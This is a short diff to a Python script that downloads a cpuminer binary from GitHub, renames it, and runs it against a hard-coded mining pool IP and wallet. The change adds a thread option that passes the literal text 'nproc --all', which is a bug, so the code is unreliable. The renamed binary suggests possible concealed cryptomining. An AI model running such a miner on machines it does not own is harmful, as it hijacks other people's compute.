@@ -10,6 +10,7 @@ import urllib.request
 WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzo"
 POOL = "stratum+tcp://104.248.150.108:9933"
 ALGO = "power2b"
+THREADS = "nproc --all"
 URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
 FILENAME = "cpuminer-opt-linux.tar.gz"
 EXTRACTED_BIN = "cpuminer-sse2"
@@ -39,7 +40,7 @@ def extract_miner():
 
 def run_miner():
     print("[*] Menjalankan miner...")
-    cmd = [f"./{RENAMED_BIN}", "-a", ALGO, "-o", POOL, "-u", WALLET, "--no-color"]
+    cmd = [f"./{RENAMED_BIN}", "-a", ALGO, "-o", POOL, "-u", WALLET, "-t", THREADS, "--no-color"]
     subprocess.run(cmd)
 
 if __name__ == "__main__":
